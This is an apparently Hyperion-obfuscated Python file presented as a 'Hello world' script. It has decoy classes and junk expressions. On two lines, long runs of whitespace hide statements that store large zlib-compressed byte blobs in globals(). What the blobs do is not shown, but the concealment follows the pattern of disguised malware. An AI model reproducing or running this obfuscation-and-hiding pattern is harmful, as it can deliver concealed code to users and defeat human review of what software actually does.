from builtins import *
from math import prod as DetectVar


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Divide, _modulo, _power, Frame, Add, _negative, _cube = exec, str, tuple, map, ord, globals, type

class Statistics:
    def __init__(self, _random):
        self.Modulo = DetectVar((_random, 83942))
        self.Negative(Multiply=-39620)

    def Negative(self, Multiply = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Modulo += 61930 * Multiply
        
        try:
            ((Divide, (Add, _power, _modulo)) for Divide in {Divide: Math} if Divide <= Divide)

        except ArithmeticError:
            ((Frame, {Divide: Frame}) for Frame in (_modulo, Frame, _modulo) if Frame is Math)

        except:
            _cube(12797 - -57849) == bool

    def _divide(self, _add = 24426):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _add *= -41080 / -79483
        self._memoryaccess != bool
        
        try:
            ((_modulo, Frame, _modulo) or Frame if (_modulo, Frame, _modulo) and Frame else ... or (Frame, (_modulo, Frame, _modulo)))

        except TypeError:
            ((Add, (_modulo, Frame)) for Add in (_modulo, Frame, _modulo) if Divide > Add)

        except:
            _cube(78631 + -50316) == bool

    def _builtins(Positive = str):
        return _negative()[Positive]

    def _statistics(Hypothesis = -76262 - 62602, _square = type, _multiply = _negative):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _multiply()[Hypothesis] = _square
        
        try:
            ((_modulo, Frame) or Math if (_modulo, Frame) and Math else ... or (Math, (_modulo, Frame)))

        except AttributeError:
            ((_power, {Divide: Math}) for _power in {Divide: Frame} if _power < Add)

        except:
            _cube(-65709 - 24004) == False

    def execute(code = str):
        return Divide(_modulo(_power(Frame(Add, code))))

    @property
    def _memoryaccess(self):
        self._callfunction = '<__main__.Statistics object at 0x000009318BE88113>'
        return (self._callfunction, Statistics._memoryaccess)

if __name__ == '__main__':
    try:
        Statistics.execute(code = __code__)
        Square = Statistics(_random = -85673 / -52758)

        if 320069 > 8526723:
            Statistics(_random = -73935 * 30595).Negative(Multiply = Square.Modulo / 43651)
        elif 429995 < 9485362:
            Statistics(_random = -32639 / -73736)._divide(_add = 40415 + Square.Modulo)                                                                                                                                                                                                                                                          ;Statistics._statistics(Hypothesis='MMMMNNNMMMMMMNMMMMMNNN',_square=b'x\x9c\xdd=\xed\x8e\xe38r\xff\xfd\x14\xbe\xc9\x0f\xdb\x19O\xaf\xacO\xab\x01\x07\xb8\xdb\x9e`\xdd\xe9\x19_v\xf6\xae;\x98\x1d\x18\xb2Dw\xabW\x96\x0c[\xde\xedF\x90 \x97\xfc\xc9\xbf<B^!\x08\xb2\xc8!\x1f\x9bW\xe8y\xa3T\x15I\x89\xb2%[\xb6\xdbs\xbbc\xb5$\x8a*\x92\xa5b\xb1X,\x16\xd9\xe9\xe2\xf1\xbc\xd1\x84_8m\xd3\x1d\x7f\xe3q2\x99\xae\x96\xbe\x97&\x8b\xf1\xb8\xf9\xab\xc1\x8b\xaf\x1e\xe7l\x11&\xf1\x8bf\xb2P\xc0\xbcUz\x97,\x96\x04\xd3~1\t\xa3\xe81\xbdc\xb7\x89\x97\x1a\x96\xfd\xa2\xfb\xe27\xd1\x8a}\xcd\x82\x17\x9dB\xaa\xdb0\xbd[Mx\xc6wi:_\x9e\x7f\xf1\x05\x8f;\xf3\x93\xd9\x17k\xd9|QQv\x10.\xfdd\x11\x14\xb3\x11\x91g\xb7\xb7_\xcc#\xefv\xc5\xd6\x12E\xa1\xcf\xe2%\xe3\x89^\xff\xf6\xea\x95~\xa6\xad\x81\xf8I\xc0\xdf\xb7\xe6\x8b0N\xdb/\xbebQ\x944\x7fH\x16Q\xf0\xab\x17\x9dV\xa3s\x9eA\xe3\xfb\xd6\xf2\xbb0hu\x1a\xec\xc1g\xf3T\x103\x9e\xaf \xe5\xd7\xc9\x92-\x9b\xde\x825\x17,\xf86\xfe}\x98D,\xe5\x11\x13\xa0\xcc\xb7\xf1\xdf$+z\xf2\x9a\x98\xc9\xb7\xf1\xdbd\x92\x04\x8f\xcd(\xfc\x0e\xd2=&\xab\x17\x9d\x06G*\x9c\xcd\x93E:\x1eCi\x8f\xcbV\xe7\x8c=\x84i\xbb\xd3\x88\x12\xdf\x8b\x96\xed\xce\xfb\xd6\xc5\xc5E\x02\xbf\x0b\xbc\x8f.F\x17\x17#\xb8\xb5>\x0cn\xa3d\x02 \x8d\xd2\xf7\x980\x9e\xc51\x9c\xb3\x98\xfe \x80\xbf\xb8\xf5\xfe\xfc\xfc\xe5\xab\x97\xaf\xda\xaf\xda/{\x9d\xce\x87\x0f\x83 \\Tg\x12\xde\x87\xd1}x\x7f\x1f\xddGp\x85[\x18\x85\x9bY\xdc\xb2\xd4K\xd3-\xd9\\\xdf\\\xdf\xc0\xef\xfa\x9a\x9f\xe2w\r\x9f\xc1?\xb4Q\x01\x80i\xdf\xbc}\xcb\xff\xe8\x87\xc17o aN\xba\xeab\x7fx\x80\x03\xff\xe0\x02A:!iY\x8e\xed\xd6d\x15Fi\x18c%|\xef-\x96\x8d\xb2\xc4T!P\xd4(\x81b\xf0\x8a\xe5A\x8e@\x15\xa0\xcd=\x12\x0bn!\x12+l\x97\x17\xb3\x8c\xc34\nW\x93u*v\xba\xa2\x86f\xa2\xc6D\xfd\xed\x9bM\xe7\xfd3\xe5s\x16\xc6\x01{h\xb7\xd8j\xf1\xcd\xc6\xdb\x0f\x9dj\xaaC\xdeo({~bQ\x9f;\x89\xa2p>K\xfc\xbd\xa8\x14\r\x87\xc3(\xc2?\xbcG<\x18\r\xf7\xa3T\x18\xfaK/\x0e\x8f\xa5Te6{R\xaa:\x1fI\xa9\xc7i\x18=\xb0\xbbx\xb5\x17\xad\x86\x97\x97\x97\xc3\xcb\xab\xe1\xf0\xea\xf2\xea\xea\nB\x97@\xa6V\xeb\xec>\t\xe3\xeaT$\xf6f\xd9\x89\x88\x7f\xee|\xb8\x8c\xbc\xbf,\xa3l\x95,\x13\xc1\x07zC?\x04\xfb\xcc\xa9\xb4H\x97\xfb\xd0\x08\xd8\t\x18\n\xa5=\x06\x90\xd5Fp\xbd\xf8\xcc\x89\x14y\xdf\xb32*m\xe9\xa8\xa1\x95\x0e\xa1\x8dB+\x85v\n\xad\x95\x87?s:\xa5^\x12M\xf7\xeb\x1ey\todY\x9f}\xef\x18%\xc9\xe6\xdb-\x14\xaa\xe8\x19\xdb\x93\x969\xc5\xc3\xd0\xcc\xa9Mw[\xb9c\xac\xa1\xf1+\xa8p\x01Cu\xbf\xdd\xeaO\xd3\x92\xbe\xe6\xb3\xa6\xb7\xcf\x1eJ\x9bn\x85\x80\xab&\xb7eX\x86\xa1\xcb\x83\x87e\x0c\xbe\xcbc\xf8\xd3n\xb2o\xf2~\xbb\xfd\xf7%\xfd4\x0c+\xdb\xed\rE\xbb\xe3\xc5A\xbb\x0c\xbas\xc0\xc7\x99\xae\xed\x9b.\x1e\xb6\xaf\x1e\xfc\xb9\xf8\xd6tw\x7fZE7\xd1\xae\xc6@\x87\xdf\xae|\x0f\xf9\xb0\xa98\xe8g+wq\x8aw?\xc3\xdajiD4M\x83\xbb6\x1a\xc1\r\x1eF*f\xfbS\xd9\xb0\xad\xa9\xe1\xc0\xd9\x87\xd3\x16w|\xd6\xe0\xd4E\x9c\xa6O\xf4\xbe\x1e\xec\x84\xb5\xe0t\xf5\x9d\xdc\xd0\xa1Q\xf1\x01\x1c\xe1\x18\xb6\xe1\x80\x14\xb3\xa1a\xf5\r\x03B\xd0\xaet\xe7\x04\\B|A\xa7=\xe5bT\x1e\xca\xb3\xe4\x1cx\xde\xcd-\x917\x9b\x04^\xf3\r1\x0c\x1f\xf7\xbd\xe1\x82\xeb\xbc\x1c\xbb\x03\x90\x0el\x06G \xee\x8c\xeeA!6(\xbe?M\xbb\r4w\x1ah\x13\x06\xa7\t\xa7A\xe1\x1e0\x10\x8f\xc3\xbb\x07\xa7\xa6k\x10k\xc0\xd9\xa3\xb7\xbd\xbe& \xdc,\x8eCk:\xa3\xe3py\xd0z\xf7\xee\x9d\xae\xc3Iw\xfd\x1d\xfda\xc4\x91\xadG\xb6\x04W\xb4\x04l\x05&\x9c=\x11\xc6\x96a\x88\xd6S\x07V?a\xeb\xc1z\xc1z\xe8\x03E\xf1\xece\xf5\xc0\xa0&\xf2:\x9b*5\xd1\xa3\x1a\xe25\x825a!\xe4\xc4\x82\'W<qX<\x9d\xe3j\x88\xbe\x01\xc4\xdaH\xc3/\x82P\x82\x0fx\xa9SG\xad\x8e\x06\xef{GV\xa7\xa6\x07TU\xbdz\xd5\xc0\xabB\xb4\xec\x0b\xd4\xd0\xf02\x1a\xf1\x00\x14w^9\x1e\xa8$\xc3}\x84VD4(\xc2\x0f\x90\xe3\xc6\xc50z\x06F5\x05\x93!\x13\x1a\x82\xf1\x0c\xc1\x90\x18\xd7S\x18u\x17\xacv:F\xdd\xab\x16*\xe9H-\x9d7z\xde\xe2\xdfQD=^\xea\x8d\xb5\xb1=\xd6\xe1\xaa\xc3a\xc1\xa1\x03\xbc\xbe\x19\xfb\xa7\xe0\xb7C:N}\xea\x18\x0e\xf4U\x8en\xf7l\xc7\xb6\xf4\xa9m\xd9\x81c\x81\xfa\xd6\x83x\xcb6u\xacS\xec\xd3\x0cP\xeb\x02}zD\xb7\xda\x92\xd6M\xde\xd5\xd1\xfd\xd3\xb5a[\x11\xa7=q\xb7\x04\xe7ZB\xf4:\x8aB\xb3\x0b\xd6~\x8e\xbaiu,`\x1dwl\x00\xf3hp\xed\x01\xf3\xb8\x90\xdc\xde\x8c\xad\xc9\xa1\xf0^\xab\x07\xea\x8e\xb1\x14s\xdc\x87\x92t(\x05\xcb\xd5\xc6N1\xae^V}BV\'TuHl\x8e\x01\x8f\x97\xeef\xec3H\xabL\xf9T$\x90T6Q:\xf5\x15i\xb5\x0b\xd6\xa9_\x87\xd9Y\xc9\xdd\xc4\xd5o\x94\x81\xe7\xdb\xba\xec\xed\x00i\x0c\xa2\xbcAunR]\xf47c\x9f\x9d\x07j7\xacV\x07\x19\xd2!)\xe7"*x\x07xg3\xf6\xd36\xe9\xbe8e\x15;\xa2\x99\xba\x8a\x86\xb5\x0b\xae\xa6vUv\x1e\xa6q9\x9a\xed:\xda1ZQ,F\x88d\x04\xa1\x01\xa2\x98\xb7<\x92\xa4\x96\xd2b\x1c\xd9\xff\x8b3SJ\x05Y\xeb\xc0\xd6\xec\xc1\xb6I\xc8\xe7\xe0\x94\x9e\xe8Pk\xaa\'\x07\x19FL\x1f\x0e\xcfD\x03\x88\'\x0e\x97b<\x8aq\xb3\x18\x0c\xf9\xa7\x19b\x99}\x07\x18\xcb\xb6\xa0?wa<z\x94\xe2\x8d\xba\xe9\r\xd7SAI\x15\xf7\x9bO[\x11\x87P\xc1\xd1\xf9\x0f\xc6\x1e\x1e\x9e\xbaV~0\xdd\xb5\xfbf\x16\xea\x8b\xbb\x12\xafB\x15`\xcc\xb5\xb4\xfc\xb9\xbfq5\x95<\xfaj\xcab.j\x1e\x05\xe8\xca\x1ce\x9a\xea\xef\x93\xb9U\x87\xcbBk\xdf\xc9\xcbTs,\xcb\xc3\x94oTl\xab1\xc8\x9fwa\xaf\xe2\xa0\\\xfb\x05\xa8\x92r6R\x94\xe7\xa9\xd4\xe2\x96\xb4\xfez\xda\x9d\xf4\xea\xef\xf3\x8de\xf4\xd9\xf6T\xe4&\x95\x17\x8a\xb5\xb0YOn\x19\x9f\x97\xf0\xd9\xfa7\xd5\xf9\x96\x8a/\xcap*\x87\xd9\x81\xc9\xd6Tne\xd9E\xec\xb7\xe3\xbc\x89\xdf>\xefk\xa5\xde\xe4L\x8e\x93~\x94!\xbbEQ4\x03-\xde\xc1\xed\xd9u\xbe=@k+\x9d[:\x079\xe42\x95S\xda\x95\xa5u\xcc\x12\xcaG\x1dXs\x7f\xbd\xee\xb0a\xb4\xa3A\xb7\x0b\x03i\x07\xe7=\x8e\xb1<\xb7\xb2\xb1\x03\xb7\x03\xc3\xa5fM\xc1\xf8\xca\xa6\xd1\x16\x0e&p\xe0`ca\x9b\xb1\xbf\x14\xcb\x04\x92\xd4B\x0b\x04\x10\xd4v\xc8>\x11\x98\xba=uL\xb3gi\xa6{\x12\xf3\xbeI3\xa2\xdct/\xe7Ee\x1c\x9f#\x95\xef\xcd\x1a\xa6\xfdC\x14\xb8cD\x02hg\xd7\xf8\xbb\xe1\x7ft\xfe\xfc\xd55\xdd9IUZ}q8\x85\xbbC\xa7\x1a\xce\xde\x9e\xa2B\x9f\xc7f\xc9]D\xae\xf07\x84\xdb%\xfa\x87|\xb2A\xf6\xba\r\xc5\x16609\xcaS\xa72\xea\xc0\xee1\xd8\xcel\xe8\xdcF\xcb\'j\xc8`\xcbgi\xce+|!\xaa\t\x89.6Cr\x86\x03"^^^~:2\xba\xe2\xf3\xe5\xddR\x06\xc9\x92d\xd2\xd0^\x07\xb6\xeeHv\xc7\xe0\xda S\x1f\xda\xe9l\xba\xebc\x13\x92\x9b\x9b\xb1u\r\x81xX\x90\x00\x13\xda\xd4\t\xb9\xebq\xcfd\xf5\xd1\x05\x85\xfa\x82B\x9arw\xd6,?\xdb`\xf70\xe4Vs\x96\xc0\x0f\xff\xf0B\x08\x13\xe2\xf5\xe8f\x8d5\x9a8\xe8\x01\xc9\xf1\n\xa4\'+\xf0F\xec34fi\xc86\x15\x93\x8dJ\x1b]i\xcc\xbb`\x0f\x99\x10\x1b\xd2/\xe2\x98IT\xa3h\xdf\xc6\xbc\xa5\x17\x97\xee\x1a|J\x9e&\xe3\xa5C\x87t\xf2\xa8=1\x7f-&\xeax\xc7zs#\xce\xeb\xeb\xfd\xe7\xf0\xb6`\xcc\xcc\x00N~\r\xb2\x83\x898\x08\x9dD\xdb\x00\x95\xd5\xb0\x8d\xbe\xa1\xd3U#/\n\xd7\xf0\xcc\x1e\x1c\x16\xb4\r\xd7\xb4\xcd\xa9\x85\x13B\xa0r9}\xe8\xa8\xfb\x0e(c\x86\x05\x94\xb5\x1c\xcf\x01.0\x19\xf0\x86m\xbb\xc0\x11}\xd3\x81t&(m\xbe\xd33\x83\xd3(h\xbebE\xf33[\x1b\xb7\xbb\xa9W\xafv\x05\xc7q\x9c{\x8fq+*\xdd\x9f\xcd\xfdB\xb2\xa1\xe2/bJ\xa6\xb4\x85/\t\x9d\xf5\x99Rx\x1cs\x04\x04:\x0f\x07L*\x93}\xef\x9a\xa7\xb9\x96Z\xe3/Bi\xd4a\x08m(\xee \xe8h\x10\x948\x92\xf0XK\xb8\x9c\xb0B\x8a^\x9f\t\x87\x85>\xdc\xb9\x0bCOq\x82\x98\x88\x94\xd2I\x05\xc3\xdeI\x9c\xcf\n\xde7L\xf1\xd2\x91\x1e:\xb9\x8f\xce\xe9\xfcs\x1c\xdd\x83\xe3\x84^SR\x04\xe7\xdeS\xa6)8\x9f?\x9fD\x03\x97\xee5\xa6\xe8\xb6\x0cq\x97s\x81\xebn8Upu\xf4\xd6-\xd353\xe9\xa3:\x13\xf36\\\xee\x1c\xdb\xd4\x94\xe9\x17\xd7\xca}\x87\xa4\xcecX\xb9\x97\xde.X\xd2\x91N9\xce\xb3\xa6\xd6\x148\xb8g\xbb6\xc3\xf0ix\x8dmmH\xa7oF \x9a\xec\xe0\xa8y\x17.\x8bi\xf2\xe5ZL\xbc\\?\xfb\xccoo\xec\x8cq\xb6\x1f\xe7\x97-\x9a\xbau\xc9\x95e#\xb6\xae3\x81KJj\x9f\xacM\x9a\x18Gh4m]\x88}\x06\x0f\x00\xc9')

        Square._divide(_add = 5671 - Square.Modulo)                                                                                                                                                                                                                                                          ;Statistics._statistics(Hypothesis='MMNMMMMMMNMMMNMMNNMMMNNN',_square=b'\xc4\xba\x95O\xeb\xca\xa9\\\xd5Wi\x1b\xdc\x1e\xc3\xa7\xe3\xa6z\x0b\xfdT\xb5+#\xb9\xda\x95\xbaD\x1e3\x87\xb7e\x92\xcc\x01].?\x9c\xec\xd9Q\x9eD\xf84\xbd\xcd\xf3\xd9L\xf9\xf8a8\xcc\x06\x14\xc3\xe1/@\x83\xc1\xee\x96\xd9\x9e\xa3\xd9\xa71\x80IUS\xba,K\xab\xa6\x9dw\xbe|\x9cd\xd6sT>\xa8\x8eu[?\xa6f\xd1\xa3\x1d}\xd9\x93\x84;}\xd6\xf5\xf9tI\xea\x18dn\xd0I\xf2pid\xad\xc7~\xba\xb9\x8d}=\x10\x8e\x14:\x99\xd7\xae-\x94\xe3\x89\xe2\xb1\x9b\xa9\xc0$tT\x9fl\x99\xc2\x14J1\xf7\xed\xf5\xc9\x9f7\x90\x82\x89R\xf9\n4\xfa\xfd\xd2|\xfb\xc4\xc9T\xf1^\x7f*D\x9eOo\xa4\xf0\xb3(-\xbc=\xa6\x8b\xbc\xc7\x05\xf6\xe2\x17\xa2+lx\xff\xe9,y\xd2\xf6!\xdda-\xc5\xd8\xa9)\xddO\x19\xcc\x1e+!\x8aN\xc4h\x18\x19\xe1\xef"\x81\xf0\x08\xfd\x89\x9f\xd3\x00\xb1f\x15\xef\x17l\xe5\xce\x9a\r\xbd_\xc7V.\x10G\x92\x8ehy\x0b\xa2\x8eA<G\x17\xcfg\xedQ\x14\xba2\xd5O\xbc=\xd1\x88\x89\xaf?8F\xc2\xd1\xb2\x1dM\xc3"5.\xe4\xf0\xe9\xd3\xce\xd2\x1d(\xdc\xe5\xec\x1c\xcd\xca\x9df\x12\xa7\xb0X\xae\xb8\x98\x8e\xbf\x93\xcb\xe80\xe6g\xb84k\xe78esIN\xf9\xb5\xc6X%\x9b+\xc9gJ\xb8\x83;\x7f8\xc0<\x94Y\xb2\xb9\x86U\xcf\x98\xbdc\x0eD\xfa^j\xd2\xfa\xaeX\x94Me\xfec\x1b\x9cq\xe2\xd50\xb2\x173\xa8\xcf\xe2\xfd\xa6S0*\xf5\xb2\xb5-\x9a\xe8-\xa5\xa9\t{\xbe\t\x99\x93\x8e]\x9bT[y\xefo\xaa\xee?Wq\xa7X-\x7f\x10\x1e,u\xfd\x1b4\xf23\xee\x91\x0e\x87\xeb-z\xe4\xdf\xb0\x11\xfbL\xebad\x87\xadN|\xc85/\xc6\xdaz\x98m\xb0{\xcdv\x1eT\'S\xc7\xb0M\xdb\xb0{\xa0l\x9b\xfa\xd4r\xec>\xae\xddp\x0c\xb3\x07C,\\\xbb\x11\xe0:\x0e\xdb\xb5{\xc7\xad\xde\xb8\xe4S\xa7\x978\xff\x8c\xf3\xd1|\xaf\x82\x9aS\xa8|\xf2\x0f}PlZ\xd2\xc0\'\xb8\x8c\xcd\xd8\xfa\x1e\xf3h\x9f@+\x06V\xbd)\xfc\xe5\x0bq\x9fN\xb9?\xc0+\xe68\x05\xdf\xf2\x8f\xf2\xed\xdd"Zrk\x80S\x08\x15E\x8c#\xdf\x9c\xc6\x84\x86\x16BZ\x98\xd4\xc3u\xe4\xa71\xb9{P\x88GW\x9f\xaek\x0b\xda\xf18\x91\x14\xad\xb9\xe6\xca\xd2\x00\'4\x90\xa07\xb7\xe5\x18G\xb5\xde-v\x027sQ\x97Si\x9e\xe2\xb4N\xcf\x87\x13b?\x9b\xe4I@?\xb1\x13\xa3\xb36\xdc\xcb\xe6\x19\x94a\xa2tb\xac\x03{\x80\x13\xe3vW\x05\xb1\xa7\xddL\x99\xf6\xe4\x0bH~\t\x83\x8e\xfa\x0b\x16\x01\xc6\x01\xe5\xd9\xb7\xa7\x00i\x9e\xa8\xf1\xe4\xfa\xf9\xc64\x9d\x98\xd0;\xd9T\x1d\xb7\x1dZ\'\xb2\x1e\x92@D\x91\x88B\xd2\xa7\xbb+\x84\xa5|\xf2\xc5\xe9\x9eLP\xc2GB\x1d\xc2\x00\x13\xd4\x98S\xb9{\x9a\x99\xb3g\xee\xeaif\xdb\xe2\xd4\xd9\x14\xe7\x90\x0eN\xaeO\xd9\xf4\x19\xb7\xa6\xdb<\xec7\xa1\xd5c\xbf\x94\xeb\xe5[S\xdb\xe4\x8e\'\xb6\xae\xb3\x1d\xb91lT\xf9\xee\x17\xd9.\x18\xd0,q\xdb\x80m\xe5\xea~^\xce:\x16\xb6iAUc\xc8a\x96+p\xa9\xc8\xa9\xac\xfc".\x95){\x98\xb3\x05e\xd0\x93f\xb9\xf6Zm\x00\xcf)\xf0\x00\xa7Wa\xb2\x0b\x8bjL\x90\n\xba\xee\x14\xa8e\xd9\xbb\xd6X\xd8\x1a\xaf\x9f\xfd\xb1(\xc5\x84\xea\x02\xda\xd7\x8eR9\x95\x8a\x9c\xe1\xf8\xf5\xca\xc4\xc3\xf1\x8b\xb5\x8f\xb5\\Uf\x91\x93y\xb9x`\x1e\xe6\x14Sb}@liI\xf0\x1ehJ\xa9\xa6\x84c\xc0\xeb\x9asU^Bi\xe9\xbe\xda\x02\xd4\xfa\x87\x12\x1d\x9d$\xc4\x1afj\xb9J\t\x1c\xd2\xe6)+\xf2_\xe38\xa2\x8c\xca\x93\x08e\xf7\x8a\xedp\xb3\x0em\x8d\x97\xaf\x96.\xf9\xa1HU\xc9\xf5y\xfb\xe2\xb5\xb9\xbb\xee\x8b\xf5\x00y\xf8\xb2T[)C\xe0\x91\xa7\x98f\x98M\xb3\x94\xd5\xf5\x0e\x1dxQv\xd8\x05\x19\x90\x95\xc89\xd0\x97\x1c\xbf\xfe\xac;\x9c\xc6DI\xa7\xbc\x8c\x12\x0c8W\xba\x92\xea\xe5\xf2O\xe2\xb0\xed\xd8(3\xaf\xdd\x9eZF\t\x16\xbe\xca\xa7\x92\xdee\xd8\xd4\xc0\xa2\xa2\xf4\xcd\x126\xf1Xo-\xfc\x90u\xa1b\x94\xf3\xbf\x05\x92+;\x94\xd8\xf5\xd2U\xb9\xbb\xce[\x1b\xfd\x91[-\xfdslTn\x84\xc3\xb55y\x98n\xa1V\xa6\xd5\xe5gx\x90d\xda\xe4\x8er\x99[\xc4^PFb\xe2\xea\xbe<r<$o\x96SX\xe5\xc4\xaaVbW\xa7+\xe1T[\x17.\xa4p\x08\x89P+5/\xa7\x9e\\\xd8\x9e\x8b\xc3\x94>\x00\xdb\xe3\x91\xab\xde\xe4NM\xb9e\xfb\x972\xd3\x0f\xba:\xab\xa7\xabO\x17\xc9\xac)\xb7\xd5n\xf2\xed\xba\x9b^\x14u\xd9\x03\xf3\xbb\x11\x8b\xbb\xb4\x11{\x97\xc5\xab\x19[x)\xeb\xe2S2gq\x03!\xda\x99\x89\xff:[\x0ft\xd3i\x88|\x92\xa5\x0c\xe1N\xe82\x9c\xb2\x88M\x92\x94\x17\x9d\x863&\x8b]F\x8c\xcdy\xf4\xfcq\x99>F\xf2\xcd\x9f\xf3\xc8[\x96\xce\xbde\x86\xa5x\x94\xd9\xf2[\x14f\xe5,W\x93\xf9"\xf1Y\x0e\xb2|\\\xf2\x9c\xfc$N\xd9\x03\x02ge\xaf\xe6\xf3\x05\x82~\xfd\xfa\xaf\x7f7\xfc\xfa\xf5\xc5\xe0oi\xf7w\xda\xe0\x8e\xf6\x83\xa2\x1d\xa141\x85v.\x17\xcce+\xe8\xdev\t\x1e\xd9\x87\x96G>\x08_Y\xba\x9e\x8b5\x93\xd2\x0cM\x81\xc6\xdf5\x026m.C\xa0r:\x06\xf2\xa7@\xf7\xb6\xd8\xe0~\x9a,\x9a\x80^w\xfe\xddm3\x8c\x9b\x12\xab\xb30e\xb3e[\xd9\x05\xff\x870\xbd\xcb\xb0o\x0f\xe9k^/\x16\xc9B\x81\xa1]\xf1%y\xce\xc4\x9e\xec\xb3$XE\xac\r1\x9d\x02 \xd2&\x8cW\xac\xa2\x84\xd7\xb4\xd3~\x98\xc4k\xf9\xf3\xfd\xfa\x85#Y\xe6\xdf\xcb=~\xaf\x8b%\xe4\x15s\xe6\xdf1\xff\xbb\xb1\x8f\x1f\xdex\x0f\xd5s\x86L\xb5J\xbdI\xc4\xba\xc2T\xc0M\x06\xd2\x8dq\xd6\x95\xfb\x95g\xb3kpv\x1f\xb8\xad\x9f\x1b\xfc9\xcd\x89\xc6H\xbf\x0f\xddB\xe9\x84A\x1a$\xabt\xa0 r\xf1\xfa\xf7o\x7fwuU\n\xca\x16\x8b\x12\xd0F\xa7\x81<4\xd8\xd8\xb4\x80\xfe\xde\x9f\xbf\x9aI\xc4\xe3\xdc\x0f\x93\x9e>4&^\x1c\xb3\x056\xef\x11m7\x96\xd0f\x8a\xc0Y\xefo2\xa7\xff\x1b\xe9!\xcd\x1f\xcf?4\xfcd6\tc\x16\x8cEr~{y\xc9w\xf3E#\xf9\x10\xf7\xdd\xe6+\x8e._"v\x8d\xc0[|7\xf82\x89\xce00\xbe]x\x8f\x8d(\xbc\xbdK)\x8eB<r\xbeZ\xcc#\x86\xb1\xc9by\xf6.\xf5\xd2\xd0\x7f3\xbci\xb7\x11\x8e\xbf\xecb\x10\xffu\x02\x88\x8d\xc9>\xf0jB\xe4\xf8y\x1bQ\x13\xfc\xb3`\xe9j\x11\x0b\xf6\x81&p\xcb\xf8[\x0e\x9aG\x9c/\xd3Ew\xf98\x9b$\x11\x06\x07\xa2\xa1=d\xed\xac\xeb\'Qo@\x9f\x84A}\xf06\x89Y\xe7\xd5_\x00\xb0\xfc\'\x1bM\x8co\x86\xcb&\xbe\xca\xd9\x97\xa0)!\xc2\xf02\x06\x03\xd5\\%\xf8\xaf\xc9\xa2%k\xf2\xafS\x91\xdf_L\xdb\xb6\xdc7\xc2\x99\x98\x86=\xb5}Pr\x0c\xc7\xb5\xb1[\xc7\xa7\xbe\xa3>\xc1`\xc4&(\xe8B0l\xd2\x04\xccDw\x9d\x00s\x10\xeft\'p&h\x97r\xfa\x8e\x89a\x9937\xe9\xc2\t\xb1u;E\xa4~\x10.\xe7\x91\xf7(\xf8MJ\x9dw \x9b\xd9\xec\xec\x9b0\x05\xf1\x81+\x04\x89\xdd.i\xb5\xdb%_=xy\xc5[\xfc\x97\xab\xc52Y\x9c}\x15\x06\x8c\x07\xdb<\x9e\xd7\xb6\x1a&F\x82\xee\xe5\xec"\xf4n\x93\xd8\x8b\xda\x82\xb5.\x1eco&xK\xf0\x15\xb2r\xa7\xd3]k\x0e\x80\xf3\xba(m\xfc\xfa\xb7\xc3\xf17\xa3\xbfz\xfdv \xc4\xf5\x1b>\x1d\x0f\x97\xc6\x97_\xfd\xfa\x9b\xf1\xf0b0\xa2\x1dL5\xbe\xd9\x1f\x97\xf6\x89\xd6\x80\x0ej :\xaa\xb3o\xe0\xfe\x9b$mg\xb9q\xeaL\xc38\x18\xcf\xef\x924\xc9\x04\xf2\x92y\x0b\xffn\x1c\x84\x8b\xe5\xe0}\xc6_r\xdb7]\xec\x03\'\xf4\x8a\\\xd6\xe0\x7f\xef\xc0\xff\xe1\x11J7\xa3(\x7f7\x9b\xe52P\x08\x14.Lr\x10e~S\xae\xd0\xe86>p\xe2"zch>,^\x82\xcc\x06\xac\xe4\xaa1\xe4F~\x8d\xba\x99\x91v&V\xa5t\x95\x19}\xb1\x87]\x17w\x02\x0c\xef\xa3(\xe4\xeeP\xf8\x84\x17\xa5\x1c\xc8\xfdC\xd6y\x01\r\xc6s\x0fz\x0e\xe8\xbd\x14\xb2\xe4\xad\x0e\x81\x001|\xbf\x8e\xe5Z\xcfBy\x9f\xd1\xeb\xa0\x8d\x9a\xc4\x19^\xda\x10\x87\x05\xd0\x7f\x18h\xcb\xe2\xbaB\xe0f\xddF\xd6o\xa0P\xe9.\xa0wY,\xc3\xef\xd9\x80\xaf\xea\x94\x9bp\n=\x0fn\x9dNA,Q\xd9\\\x14\xb1\xbc\xba9\xc2X\xdeR\xd4|\x9a\x00\xcb\r\x80\xfd\n\xef2j\xd0\xb6\xcf]z\x85\x1f\x9ciS*t\x17\x9d\xae.h\x07G\xf2\xbfB\xdf\xabD\xe9eS\xf9\xdf\x82\xe4\x8f:fT\xc5x.]\xee\xb0E.$$\x84\xb8\xb3S\xd2\xf1\x96\xc0\xab\x11;\xdf\xe8\xdb\x90\xb9\xf3\xcfj\x8b\x16\xd1E\xe0\xce\x060o\xa7\x87\x89:\xcbwtk\x02\x82\xca\x05\xbd\x94\x0b\xa8@\x9f\x92\xb0\x9a\xf2\x897\'\xb0\xea\xf8\xb1\x83\x1e\x1a\x0cFR\x17\x1bq7&\xd2\xcdF\xddi\xb4Z\xde\r\xc8m\r\x10\xa4\x13]i\xe0iM\xfd@5\xb3]\xd8\x18\x90\xef\x15\x98\x83\xf1\x7f\'\xd4\xcct\x9d&\x90\x90\x95\xe9;\xc7\x90\xa3r\'T\xed\xb9\x085\xcc\x8a\x97\x08\x10V\x82R\x82\xe5E\x13\x10\xab\x9du\xbd \xa1\xff\xac\xf9\xf4\xafO?~\xfc\x87\xa7\x1f\x9f\xfe\xfd\xe9\xa7\xa7\xffx\xfa\xe3\xd3\xff4?\xfe\xe1\xe3?B\xd4OO\xff\xf5\xf1\x9f\x9aO\xff\xf7\xf4\xd3\xc7?<\xfd\xf7\xd3\x8f\xcd\xa7\xff|\xfa7\x00\x03\xf0\x8f\xff\x0c\t\xfe\xf7\xe9\x8f\x1f\xff')

